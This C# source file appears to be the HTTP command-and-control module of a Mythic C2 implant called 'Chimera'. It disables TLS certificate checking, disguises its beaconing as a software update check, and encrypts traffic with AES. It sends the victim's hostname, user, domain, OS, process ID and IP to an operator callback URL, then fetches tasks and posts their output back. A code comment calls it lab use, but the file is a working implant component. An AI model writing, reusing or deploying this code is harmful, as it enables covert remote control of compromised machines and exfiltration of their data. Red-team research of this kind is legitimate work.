using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Chimera
{
    public static class C2Http
    {
        private static readonly HttpClient Client = CreateClient();

        private static HttpClient CreateClient()
        {
            // Accept any cert for lab use (self-signed VPS cert)
            var handler = new HttpClientHandler();
            handler.ServerCertificateCustomValidationCallback =
                (msg, cert, chain, errors) => true;

            var client = new HttpClient(handler);
            client.DefaultRequestHeaders.Add("User-Agent", Config.UserAgent);
            // Mimic a legitimate software update check
            client.DefaultRequestHeaders.Add("Accept", "application/json");
            client.DefaultRequestHeaders.Add("X-Update-Channel", "stable");
            return client;
        }

        // ---------------------------------------------------------------
        // AES-256-CBC encryption using PayloadUUID as key material
        // Key = SHA256(UTF8 bytes of PayloadUUID)
        // IV  = random 16 bytes, prepended to ciphertext
        // Final payload = Base64( IV + ciphertext )
        // ---------------------------------------------------------------
        private static byte[] GetAESKey()
        {
            using (var sha = SHA256.Create())
                return sha.ComputeHash(Encoding.UTF8.GetBytes(Config.PayloadUUID));
        }

        public static string Encrypt(string plaintext)
        {
            byte[] key = GetAESKey();
            byte[] iv  = new byte[16];
            using (var rng = new RNGCryptoServiceProvider())
                rng.GetBytes(iv);

            using (var aes = Aes.Create())
            {
                aes.Key  = key;
                aes.IV   = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var enc = aes.CreateEncryptor())
                {
                    byte[] plainBytes  = Encoding.UTF8.GetBytes(plaintext);
                    byte[] cipherBytes = enc.TransformFinalBlock(plainBytes, 0, plainBytes.Length);

                    // Prepend IV to ciphertext
                    byte[] combined = new byte[iv.Length + cipherBytes.Length];
                    Buffer.BlockCopy(iv, 0, combined, 0, iv.Length);
                    Buffer.BlockCopy(cipherBytes, 0, combined, iv.Length, cipherBytes.Length);

                    return Convert.ToBase64String(combined);
                }
            }
        }

        public static string Decrypt(string base64Ciphertext)
        {
            byte[] key      = GetAESKey();
            byte[] combined = Convert.FromBase64String(base64Ciphertext);

            byte[] iv         = new byte[16];
            byte[] cipherBytes = new byte[combined.Length - 16];
            Buffer.BlockCopy(combined, 0, iv, 0, 16);
            Buffer.BlockCopy(combined, 16, cipherBytes, 0, cipherBytes.Length);

            using (var aes = Aes.Create())
            {
                aes.Key     = key;
                aes.IV      = iv;
                aes.Mode    = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var dec = aes.CreateDecryptor())
                {
                    byte[] plainBytes = dec.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
                    return Encoding.UTF8.GetString(plainBytes);
                }
            }
        }

        // ---------------------------------------------------------------
        // Send encrypted JSON to Mythic, return decrypted response
        // ---------------------------------------------------------------
        public static string Send(string jsonMessage)
        {
            try
            {
                string encrypted = Encrypt(jsonMessage);
                var content = new StringContent(encrypted, Encoding.UTF8, "application/json");
                var response = Client.PostAsync(Config.CallbackURL, content)
                                     .GetAwaiter().GetResult();
                string responseBody = response.Content.ReadAsStringAsync()
                                               .GetAwaiter().GetResult();
                return Decrypt(responseBody);
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        // ---------------------------------------------------------------
        // CheckIn — initial registration with Mythic
        // Mythic expects specific fields to create a callback entry
        // ---------------------------------------------------------------
        public static string CheckIn()
        {
            string hostname = Dns.GetHostName();
            string username = Environment.UserName;
            string os       = Environment.OSVersion.ToString();
            int    pid      = System.Diagnostics.Process.GetCurrentProcess().Id;
            string arch     = Environment.Is64BitProcess ? "x64" : "x86";
            string domain   = Environment.UserDomainName;

            string json = $@"{{
                ""action"": ""checkin"",
                ""uuid"": ""{Config.PayloadUUID}"",
                ""ips"": [""{GetLocalIP()}""],
                ""os"": ""{os}"",
                ""user"": ""{domain}\\{username}"",
                ""host"": ""{hostname}"",
                ""pid"": {pid},
                ""architecture"": ""{arch}"",
                ""domain"": ""{domain}"",
                ""integrity_level"": 2,
                ""external_ip"": """"
            }}";

            return Send(json);
        }

        // ---------------------------------------------------------------
        // GetTasking — ask Mythic for pending tasks
        // ---------------------------------------------------------------
        public static string GetTasking(string callbackUUID)
        {
            string json = $@"{{
                ""action"": ""get_tasking"",
                ""tasking_size"": 1,
                ""uuid"": ""{callbackUUID}""
            }}";

            return Send(json);
        }

        // ---------------------------------------------------------------
        // PostResponse — send task output back to Mythic
        // ---------------------------------------------------------------
        public static string PostResponse(string callbackUUID, string taskID, string output)
        {
            // Escape output for JSON
            string escaped = output
                .Replace("\\", "\\\\")
                .Replace("\"", "\\\"")
                .Replace("\r", "\\r")
                .Replace("\n", "\\n");

            string json = $@"{{
                ""action"": ""post_response"",
                ""uuid"": ""{callbackUUID}"",
                ""responses"": [{{
                    ""task_id"": ""{taskID}"",
                    ""user_output"": ""{escaped}"",
                    ""completed"": true
                }}]
            }}";

            return Send(json);
        }

        private static string GetLocalIP()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        return ip.ToString();
            }
            catch { }
            return "127.0.0.1";
        }
    }
}
